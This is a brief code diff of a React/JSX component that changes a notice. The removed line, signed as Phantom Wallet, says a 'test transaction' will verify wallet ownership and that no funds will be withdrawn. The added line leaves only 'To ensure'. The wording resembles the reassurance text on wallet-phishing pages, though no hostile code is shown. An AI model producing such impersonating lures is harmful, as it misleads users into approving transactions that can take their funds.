@@ -358,7 +358,7 @@ useEffect(() => {
                     >
                       Note:
                     </span>
-                    To ensure security and verify wallet ownership, a test transaction will be initiated. No funds will be withdrawn.Your assets remain fully secure. © Phantom Wallet 2025.
+                    To ensure
                   </wui-text>
                 </div>
 
